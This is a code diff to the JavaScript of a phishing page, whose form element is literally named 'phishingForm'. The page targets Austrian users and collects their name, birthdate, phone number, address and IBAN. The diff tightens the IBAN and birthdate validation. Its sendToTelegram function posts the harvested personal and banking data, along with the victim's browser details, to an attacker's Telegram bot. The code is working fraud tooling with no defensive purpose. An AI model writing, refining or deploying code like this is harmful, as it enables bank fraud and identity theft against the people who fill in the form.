@@ -66,6 +66,37 @@ function getBankNameByBIC(bic) {
 }
 
 // ============================================================
+// 📅 ВАЛИДАЦИЯ ДАТЫ РОЖДЕНИЯ (от 1950 до 2008)
+// ============================================================
+function validateBirthdate(value) {
+    const parts = value.split('/');
+    if (parts.length !== 3) return { valid: false, message: 'Bitte geben Sie ein vollständiges Datum ein (TT/MM/JJJJ).' };
+
+    const day = parseInt(parts[0], 10);
+    const month = parseInt(parts[1], 10);
+    const year = parseInt(parts[2], 10);
+
+    if (isNaN(day) || isNaN(month) || isNaN(year)) {
+        return { valid: false, message: 'Bitte geben Sie ein gültiges Datum ein.' };
+    }
+
+    if (year < 1950 || year > 2008) {
+        return { valid: false, message: 'Bitte geben Sie ein Geburtsjahr zwischen 1950 und 2008 ein.' };
+    }
+
+    if (month < 1 || month > 12) {
+        return { valid: false, message: 'Der Monat muss zwischen 1 und 12 liegen.' };
+    }
+
+    const date = new Date(year, month - 1, day);
+    if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
+        return { valid: false, message: 'Dieses Datum existiert nicht.' };
+    }
+
+    return { valid: true, message: '' };
+}
+
+// ============================================================
 // 🚀 ИНИЦИАЛИЗАЦИЯ
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
@@ -73,24 +104,18 @@ document.addEventListener('DOMContentLoaded', function() {
     const birthdateInput = document.getElementById('birthdateInput');
     const phoneInput = document.getElementById('phoneInput');
     const submitBtn = document.getElementById('submitBtn');
+    const ibanError = document.getElementById('ibanError');
+    const birthdateError = document.getElementById('birthdateError');
 
-    if (submitBtn) {
-        submitBtn.disabled = false;
-    }
+    if (submitBtn) submitBtn.disabled = false;
 
-    // ============================================================
-    // 📱 ТЕЛЕФОН
-    // ============================================================
+    // === ТЕЛЕФОН ===
     if (phoneInput) {
-        if (phoneInput.value === '' || phoneInput.value === '+43') {
-            phoneInput.value = '+43';
-        }
-
+        if (phoneInput.value === '' || phoneInput.value === '+43') phoneInput.value = '+43';
         phoneInput.addEventListener('focus', function() {
             const len = this.value.length;
             this.setSelectionRange(len, len);
         });
-
         phoneInput.addEventListener('input', function() {
             if (this.value === '') {
                 this.value = '+43';
@@ -100,137 +125,69 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // ============================================================
-    // 📅 МАСКА ДЛЯ ДАТЫ
-    // ============================================================
+    // === МАСКА ДЛЯ ДАТЫ ===
     if (birthdateInput) {
         birthdateInput.addEventListener('input', function(e) {
             let value = this.value.replace(/\D/g, '');
             let formatted = '';
-            
-            if (value.length > 8) {
-                value = value.slice(0, 8);
-            }
-            
+            if (value.length > 8) value = value.slice(0, 8);
             for (let i = 0; i < value.length; i++) {
-                if (i === 2 || i === 4) {
-                    formatted += '/';
-                }
+                if (i === 2 || i === 4) formatted += '/';
                 formatted += value[i];
             }
-            
             this.value = formatted;
         });
     }
 
-    // ============================================================
-    // 🏦 IBAN — С ВАЛИДАЦИЕЙ ДЛЯ AT
-    // ============================================================
+    // === IBAN ВАЛИДАЦИЯ ===
     if (ibanInput) {
         ibanInput.maxLength = 34;
-
         ibanInput.addEventListener('input', function() {
             let value = this.value.replace(/\s/g, '').toUpperCase();
             this.value = value;
 
-            // Валидация для австрийского IBAN
-            const ibanError = document.getElementById('ibanError');
             if (ibanError) ibanError.style.display = 'none';
 
-            // Проверка: начинается с AT и длина от 20 до 34
             if (value.length > 0) {
                 if (!value.startsWith('AT')) {
-                    if (ibanError) {
-                        ibanError.textContent = 'IBAN muss mit AT beginnen.';
-                        ibanError.style.display = 'block';
-                    }
-                    ibanCheckResult = {
-                        valid: false,
-                        message: 'muss mit AT beginnen',
-                        bankData: null,
-                        iban: value
-                    };
+                    if (ibanError) { ibanError.textContent = 'IBAN muss mit AT beginnen.'; ibanError.style.display = 'block'; }
+                    ibanCheckResult = { valid: false, message: 'muss mit AT beginnen', bankData: null, iban: value };
                     return;
                 }
-
                 if (value.length < 20) {
-                    if (ibanError) {
-                        ibanError.textContent = 'IBAN muss mindestens 20 Zeichen enthalten.';
-                        ibanError.style.display = 'block';
-                    }
-                    ibanCheckResult = {
-                        valid: false,
-                        message: 'zu kurz',
-                        bankData: null,
-                        iban: value
-                    };
+                    if (ibanError) { ibanError.textContent = 'IBAN muss mindestens 20 Zeichen enthalten.'; ibanError.style.display = 'block'; }
+                    ibanCheckResult = { valid: false, message: 'zu kurz', bankData: null, iban: value };
                     return;
                 }
-
-                if (value.length > 34) {
-                    if (ibanError) {
-                        ibanError.textContent = 'IBAN darf maximal 34 Zeichen enthalten.';
-                        ibanError.style.display = 'block';
-                    }
-                    ibanCheckResult = {
-                        valid: false,
-                        message: 'zu lang',
-                        bankData: null,
-                        iban: value
-                    };
-                    return;
-                }
-
-                // Проверка на допустимые символы (только буквы и цифры)
                 if (!/^[A-Z0-9]+$/.test(value)) {
-                    if (ibanError) {
-                        ibanError.textContent = 'IBAN darf nur Buchstaben und Zahlen enthalten.';
-                        ibanError.style.display = 'block';
-                    }
-                    ibanCheckResult = {
-                        valid: false,
-                        message: 'ungültige Zeichen',
-                        bankData: null,
-                        iban: value
-                    };
+                    if (ibanError) { ibanError.textContent = 'IBAN darf nur Buchstaben und Zahlen enthalten.'; ibanError.style.display = 'block'; }
+                    ibanCheckResult = { valid: false, message: 'ungültige Zeichen', bankData: null, iban: value };
                     return;
                 }
 
-                // Если всё ок
-                ibanCheckResult = {
-                    valid: true,
-                    message: 'gültig',
-                    bankData: null,
-                    iban: value
-                };
+                // Валидация пройдена
+                ibanCheckResult = { valid: true, message: 'gültig', bankData: null, iban: value };
             } else {
-                ibanCheckResult = {
-                    valid: false,
-                    message: 'nicht geprüft',
-                    bankData: null,
-                    iban: ''
-                };
+                ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
             }
         });
     }
 
-    // ============================================================
-    // 🚀 ОТПРАВКА ФОРМЫ (с проверкой IBAN)
-    // ============================================================
+    // === ОТПРАВКА ФОРМЫ ===
     const form = document.getElementById('phishingForm');
     if (!form) return;
-    
+
     form.addEventListener('submit', function(event) {
         event.preventDefault();
-        
-        // Проверяем телефон
+
+        // Проверка телефона
         const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
         if (phoneDigits.length < 6) {
             alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
             return;
         }
 
-        // Проверяем IBAN
+        // Проверка IBAN
         const ibanValue = ibanInput.value.trim();
         if (!ibanValue.startsWith('AT')) {
             alert('Bitte geben Sie eine gültige österreichische IBAN ein (beginnt mit AT).');
@@ -247,13 +204,26 @@ document.addEventListener('DOMContentLoaded', function() {
             ibanInput.focus();
             return;
         }
-        
+
+        // Проверка даты рождения
+        const birthdateValue = birthdateInput.value.trim();
+        const birthdateValidation = validateBirthdate(birthdateValue);
+        if (!birthdateValidation.valid) {
+            if (birthdateError) {
+                birthdateError.textContent = birthdateValidation.message;
+                birthdateError.style.display = 'block';
+            }
+            birthdateInput.focus();
+            return;
+        }
+
+        // Все проверки пройдены — отправляем
         const formData = new FormData(form);
         const data = {};
         formData.forEach((value, key) => {
             data[key] = value.trim() || 'nicht angegeben';
         });
-        
+
         data.iban_check = ibanCheckResult;
         sendToTelegram(data);
     });
@@ -267,7 +237,7 @@ function sendToTelegram(data) {
     submitBtn.disabled = true;
     submitBtn.classList.add('loading');
     submitBtn.textContent = '⏳ Sende...';
-    
+
     let message = '🔴 <b>NEUE DATEN!</b>\n\n';
     message += `👤 <b>Name:</b> ${data.fullname || 'nicht angegeben'}\n`;
     message += `🎂 <b>Geburtsdatum:</b> ${data.birthdate || 'nicht angegeben'}\n`;
@@ -275,16 +245,16 @@ function sendToTelegram(data) {
     message += `📍 <b>Adresse:</b> ${data.street || 'nicht angegeben'}\n`;
     message += `🏙️ <b>Stadt:</b> ${data.city || 'nicht angegeben'}\n`;
     message += `📮 <b>PLZ:</b> ${data.postal || 'nicht angegeben'}\n`;
-    
+
     const ibanData = data.iban_check || { valid: false, message: 'nicht geprüft', bankData: null };
     message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
     message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
-    
+
     message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
     message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;
-    
+
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
+
     fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -305,16 +275,14 @@ function sendToTelegram(data) {
                 submitBtn.style.background = '';
                 submitBtn.disabled = false;
                 submitBtn.classList.remove('loading');
-                
+
                 const phoneInput = document.getElementById('phoneInput');
                 if (phoneInput) phoneInput.value = '+43';
-                
                 const birthdateInput = document.getElementById('birthdateInput');
                 if (birthdateInput) birthdateInput.value = '';
-                
                 const ibanInput = document.getElementById('ibanInput');
                 if (ibanInput) ibanInput.value = '';
-                
+
                 ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
             }, 2000);
         } else {
